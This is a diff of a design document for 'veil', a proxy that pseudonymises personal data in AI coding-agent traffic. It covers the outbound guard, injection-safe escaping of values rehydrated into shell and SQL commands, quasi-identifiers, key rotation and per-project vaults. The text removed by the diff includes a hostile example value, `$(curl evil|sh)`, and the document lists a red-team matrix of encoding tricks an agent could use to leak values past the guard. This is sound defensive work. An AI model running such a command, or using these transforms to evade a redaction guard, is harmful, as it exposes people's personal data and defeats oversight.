@@ -87,7 +87,7 @@ real values back in history; re‑redaction maps them to the *same* tokens → i
 
 **Outbound guard (after redaction, before forwarding):** structure-blind second pass over every
 string in the final body: all real values veil knows, in plain + encoded forms (URL, JSON `\u`,
-NFD, base64 at 3 alignments), plus pattern PII. Repairs in place (value → token); a hit inside a
+NFD; base64 runs decoded at every alignment), plus pattern PII. Repairs in place (value → token); a hit inside a
 signed thinking block can't be repaired → request blocked (`400`, `x-should-retry: false`). Audit
 lines carry field path, kind and token, never the value. Exists because both mock-test leaks were
 "didn't look there" bugs.
@@ -101,19 +101,43 @@ signed blocks can't be edited — such a hit means an earlier leak to investigat
 **Pseudonym notice:** agent requests get one static system block telling the model pseudonyms are
 opaque and must be used whole (real models grep/LIKE on token fragments). Static text keeps caching intact.
 
-**Matching:** Aho–Corasick for known values and guard needles (Python `re` alternation of thousands
-of literals cost ~400 ms per Claude Code request; now ≤60 ms). Known emails match case-insensitively.
+**Matching:** Aho–Corasick over 6-character anchors for known values, guard needles and tokens
+(Python `re` alternation of thousands of literals cost ~400 ms per Claude Code request). Known emails
+match case-insensitively. 1.2M seeded values: 1.1 GB, 37 + 68 ms per 234 KB request (`docs/SCALE.md`).
 
-**Rehydrating into commands (data → code boundary):** Bash commands are rehydrated by a quote-aware
-scanner: each real value is escaped for where its token sits — unquoted (`shlex.quote`), `'…'`,
-`"…"`, or an SQL `'…'` literal inside a double-quoted string (`sqlite3 db "… where name = 'TOKEN'"`:
-`'` doubled, then shell-escaped). A seeded name like `$(curl evil|sh)` or `O'Brien` stays data.
-Without this, 23 of 35 injection tests fail.
+**Rehydrating into commands (data → code boundary):** a real value put into a Bash command is
+escaped for every language layer it passes through, innermost first (`veil/shell.py`):
 
-**Bypass matrix (`python -m veil_dev.redteam`, regression-tested):** 20 one-command transforms an agent can
+1. **Embedded language.** The shell word or heredoc is code for an interpreter:
+   - `python -c`, including f-strings (braces doubled), raw strings (no quote or backslash fits:
+     the token stays) and bytes;
+   - `node -e` (template literals: `${` escaped), `ruby -e` (`#{`), `perl -e` (`$`, `@`), `php -r`,
+     `jq`, `awk`, `mongosh --eval`;
+   - SQL clients, including `sqlite3 db "…"`, `psql -c`, `mysql -e` (backslashes too) and heredocs
+     fed to them;
+   - `bash -c` and `eval`, handled recursively.
+
+   The value is escaped for the string literal it sits in. A token in *code* position is restored
+   only if the value is inert there (letters, digits, `_.@+-`).
+2. **Shell quoting at that spot.** Unquoted, `'…'`, `"…"`, `$'…'`, backticks (inert values only),
+   `$( … )` (a fresh context), and heredoc bodies: a quoted delimiter is literal; an unquoted one makes
+   `\ $ `` ` `` special, and a value containing a newline could end the body.
+3. **Where the value's output becomes code, only inert values are restored.** That covers a
+   substitution in command position (`$(printf %s X)`), output piped into an interpreter or into
+   `xargs -I`/`xargs sh`, and values reaching code through variables (`v=X; python3 -c "…$v…"`).
+   Values piped into an SQL client inside an SQL literal are SQL-escaped instead.
+
+When no safe spelling exists, the pseudonym stays in the command: it finds nothing rather than
+running something nobody wrote. Evidence:
+
+- 35 shell/SQL injection tests (23 fail without this);
+- 30 embedded contexts × 15 hostile values, really executed;
+- 50,000 fuzzed nestings, really executed (`python -m veil_dev.shellfuzz`), with 0 executions.
+
+**Bypass matrix (`python -m veil_dev.redteam`, regression-tested):** 21 one-command transforms an agent can
 apply (octal/hex/base64 dumps, repr/JSON escapes, rev, rot13, upper-casing, one char per line, spaced
-letters, `cut` mid-value, SQL `hex()`/`upper()`/`replace()`/`substr()`/`unicode()`, URL-encoding). All 20
-contained: byte dumps blocked by command policy; the guard withholds message content whose
+letters, `cut` mid-value or mid-character, SQL `hex()`/`upper()`/`replace()`/`substr()`/`unicode()`, URL-encoding). All 20
+contained (all 21 now): byte dumps blocked by command policy; the guard withholds message content whose
 case/space/reversal/rot13/hex/URL/escape-normalised view contains a seeded value of ≥ 8 chars, replaces
 value heads/tails cut at line boundaries with `[veil:partial]`, and seeds email local parts as their own
 values (`leonekohler at surfeu dot de`). The audit oracle decodes all of these (plus char codes) —
@@ -233,6 +257,49 @@ snapshot. The interval stretches to 10× the last re-seed's duration.
 A value redacted *before* it was seeded keeps its first token: stability, which keeps prompt caching
 and the conversation consistent, wins over regrouping it with its person.
 
+## Quasi-identifiers and direct identifiers
+
+- **Direct identifiers** are always pseudonymised (`id_number_ab12`): columns named for SSNs,
+  passports, national or tax IDs, driver's licences, IBANs and similar, plus SSN and IBAN patterns
+  (the IBAN's mod-97 checksum is validated).
+- **Quasi-identifiers** are the birth date, postal code, city, company and job title of person
+  records. Date columns are read only when named for a birth date. Each value is seeded with the
+  number of records sharing it, and only *rare* values (shared by fewer than 5 records) are
+  considered: "London" identifies nobody, a 5-digit postal code with one customer does.
+- `veil quasi warn` (the default) logs each request that newly carries rare quasi-identifiers. The
+  log line gives kinds and counts, never values, and flags a person with two or more kinds together.
+  Each value is reported once per proxy run.
+- `veil quasi redact` pseudonymises them (`city_ab12`, `dob_ab12`) without the person's code, so
+  three people who share a city are not linked to each other. `veil quasi off` disables both.
+
+## Keys and rotation
+
+- `veil keys rotate` replaces the vault key: the vault, retired tokens, `known.enc` and `sources.enc`
+  are re-encrypted, and pseudonyms don't change. The sequence is crash-safe:
+  1. A marker file is written and the new key is stored as `vault-key-next`.
+  2. Every row is read with whichever key opens it, and the files are swapped in.
+  3. The new key replaces `vault-key`.
+
+  `state.load()` finishes a rotation that was interrupted between these steps. It refuses while a
+  proxy is running, since the proxy would keep writing to the replaced file.
+- `veil keys rotate --token-secret` issues new pseudonyms, after a suspected leak of the secret or a
+  team change. Old tokens are *retired*: they still rehydrate, so conversations in flight keep
+  working, but they are never issued again. `--drop-old` forgets them. Teams then re-export the
+  bundle.
+
+## Per-project vaults
+
+Each project can get its own vault, keys, port and service:
+
+```sh
+VEIL_HOME=~/.veil-acme veil init ~/code/acme --port 8788
+VEIL_HOME=~/.veil-acme VEIL_SERVICE_LABEL=dev.veil.acme veil service install --port 8788
+```
+
+The project's hook commands carry `--port 8788 --home ~/.veil-acme`. Before this, a hook fell back to
+the default vault whenever the per-project proxy rejected its secret, which mixed two projects'
+values.
+
 ## Fast hooks
 
 `veil-hook pre|post` (stdlib only) forwards the hook event to the running proxy's
@@ -276,8 +343,9 @@ system prompt, and fails open on schema mismatch → backup only.
   vendors, accidental leakage in prompts, prompt‑injected exfiltration via rehydrated web/egress calls.
 - **Does not protect against:** a compromised local machine; real values in Claude Code's local
   transcript (rehydrated display); OTel/analytics that capture tool output before hooks
-  (set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`); re‑identification via quasi‑identifiers;
-  PII in images; encoded forms not yet decoded.
+  (set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`); re‑identification through combinations of common
+  values (rare quasi-identifiers are reported or pseudonymised); PII in images (out of scope: a
+  developer who wants to leak a screenshot can); encoded forms not yet decoded.
 
 ## Roadmap
 
@@ -292,8 +360,9 @@ system prompt, and fails open on schema mismatch → backup only.
    DynamoDB key segments, warehouses; `git log` authors. ✅ continuous re-seeding (2026-10-21).
 3. ✅ Leak harnesses: `veil audit` (canary scenario, real agents, offline), bypass matrix
    (`veil_dev.redteam`), pilot on a real repository (`veil_dev.pilot`), CI with live databases.
-4. ✅ done (see 1d). Still open: per-project vault namespaces, key rotation, team secret distribution.
-5. Optional NER layer (Privacy Filter / GLiNER) for free text; quasi‑identifier warnings.
+4. ✅ done (see 1d). ✅ Per-project vaults, key rotation (2026-10-21). Still open: team secret distribution
+   beyond a shared bundle.
+5. ✅ Optional NER layer (GLiNER) for free text; ✅ quasi‑identifier warnings / redaction (2026-10-21).
 6. ✅ OpenAI Chat Completions + Responses adapters (Aider/Continue/SDK; Codex). Still open: Bedrock/Vertex
    formats; MCP DB server with masking.
 7. ✅ `veil init` / `status` / `service`; ✅ team mode, managed-settings drop-in, Linux (systemd + Secret
